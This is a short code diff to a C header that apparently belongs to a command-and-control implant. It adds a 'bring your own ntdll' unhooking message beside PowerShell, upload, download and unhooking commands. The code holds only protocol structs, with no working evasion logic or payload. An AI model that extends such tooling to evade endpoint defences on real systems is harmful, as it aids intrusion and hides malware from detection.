@@ -128,6 +128,31 @@ union {
 };
 MSG_TEMPLATE_END(unhookl);
 
+/* -- UNHOOK_BYON: SEND AN NTDLL TO UNHOOK WITH -- */
+
+REQ_TEMPLATE_BEGIN(unhookbyon);
+	int64_t file_len;
+REQ_TEMPLATE_END(unhookbyon);
+
+ALLOWED_RES(unhookbyon);
+SIMPLE_FIN(unhookbyon);
+SIMPLE_FAK(unhookbyon);
+
+struct unhookbyon_unhooking_t {
+	uint8_t sanity;
+};
+
+MSG_TEMPLATE_BEGIN(unhookbyon);
+union {
+	struct unhookbyon_req_t req;
+	struct unhookbyon_res_t res;
+	struct unhookbyon_unhooking_t unhooking;
+	struct unhookbyon_fin_t fin;
+	struct unhookbyon_fak_t fak;
+};
+MSG_TEMPLATE_END(unhookbyon);
+
+
 enum wrkr_msg_enum_t {
 	POWERSHELL,
 	UPLOAD,
@@ -146,8 +171,8 @@ struct wrkr_msg_t {
 		struct upload_msg_t upload;
 		struct download_msg_t download;
 		struct unhookl_msg_t unhookl;
+		struct unhookbyon_msg_t unhookbyon;
 		/*
-			struct unhookbyon_msg_t unhookbyon;
 			struct runcode_msg_t runcode;
 			struct runbin_msg_t runbin;
 		*/
